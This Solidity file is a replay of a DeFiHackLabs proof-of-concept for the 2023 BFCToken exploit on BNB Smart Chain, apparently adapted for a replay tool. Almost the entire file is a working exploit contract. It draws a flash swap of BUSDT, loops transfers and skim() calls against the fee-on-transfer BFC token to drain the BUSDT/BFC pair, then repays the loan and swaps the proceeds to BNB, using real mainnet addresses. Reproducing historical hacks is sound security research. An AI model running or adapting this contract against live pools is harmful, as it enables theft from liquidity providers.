// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../interface.sol";

// @KeyInfo - Total Lost : ~$38K
// Attacker : https://bscscan.com/address/0x7cb74265e3e2d2b707122bf45aea66137c6c8891
// Attacker Contract : https://bscscan.com/address/0x9180981034364f683ea25bcce0cff5e03a595bef
// Vulnerable Contract : https://bscscan.com/address/0x595eac4a0ce9b7175a99094680fbe55a774b5464
// Attack Tx : https://bscscan.com/tx/0x8ee76291c1b46d267431d2a528fa7f3ea7035629500bba4f87a69b88fcaf6e23

// @Analysis
// https://twitter.com/CertiKAlert/status/1700621314246017133

// Synthetic, cheatcode-free replay of the DeFiHackLabs BFCToken PoC
// (evm-hack-registry/2023-09-BFCToken_exp/test/BFCToken_exp.sol). The
// original test runs the attack INLINE on the Foundry `Test` contract itself
// (attacker == address(this)) and uses `vm.createSelectFork` / `vm.label` /
// `deal` / `emit log_named_decimal_uint`, none of which the EVM Playground's
// replay engine supports. `deal(BUSDT, address(this), 0)` and
// `deal(address(this), 0)` are dropped: a freshly deployed exploit contract
// already starts at zero balance for both, so both calls are no-ops here.
// Everything else — the flash-swap draw, the `pancakeCall` callback that
// abuses `skim()` against the fee-on-transfer BFC token to drain the
// BUSDT/BFC pair, and the final BUSDT->BNB cash-out — is preserved verbatim.
contract BFCTokenExploit {
    Uni_Pair_V2 BUSDT_WBNB = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 BUSDT_BFC = Uni_Pair_V2(0x71e1949A1180C0F945fe47C96f88b1a898760c05);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 BFC = IERC20(0x595eac4A0CE9b7175a99094680fbe55A774B5464);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() public {
        bytes memory swapData = abi.encode(address(BFC), address(BUSDT_BFC), 400_000 * 1e18);
        BUSDT_WBNB.swap(400_000 * 1e18, 0, address(this), swapData);
        swapBUSDTToBNB();
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        BFC.approve(address(Router), type(uint256).max);
        BUSDT.approve(address(Router), type(uint256).max);

        swapBUSDTToBFC(BUSDT.balanceOf(address(BUSDT_BFC)));
        BFC.transfer(address(BFC), BFC.balanceOf(address(this)));
        swapBUSDTToBFC(BUSDT.balanceOf(address(this)));
        // Start exploit
        uint256 counter;
        while (counter < 100) {
            uint256 balanceBFC = BFC.balanceOf(address(this));
            uint256 pairBalanceBFC = BFC.balanceOf(address(BUSDT_BFC));

            if (balanceBFC >= (50 * pairBalanceBFC)) {
                balanceBFC = (pairBalanceBFC - 1) * 50;
            }

            BFC.transfer(address(BUSDT_BFC), balanceBFC);
            BUSDT_BFC.skim(address(this));
            BFC.transfer(address(BUSDT_BFC), 0);

            if (balanceBFC < (pairBalanceBFC * 50)) {
                ++counter;
            } else {
                break;
            }
        }
        // End exploit
        swapBFCToBUSDT();
        uint256 returnFlashAmount = (_amount0 * 1000) / 997 + 1;
        BUSDT.transfer(address(BUSDT_WBNB), returnFlashAmount);
    }

    receive() external payable {}

    function swapBUSDTToBFC(
        uint256 amountIn
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(BFC);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp + 1000
        );
    }

    function swapBFCToBUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(BFC);
        path[1] = address(BUSDT);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BFC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }

    function swapBUSDTToBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(WBNB);

        Router.swapExactTokensForETH(BUSDT.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000);
    }
}
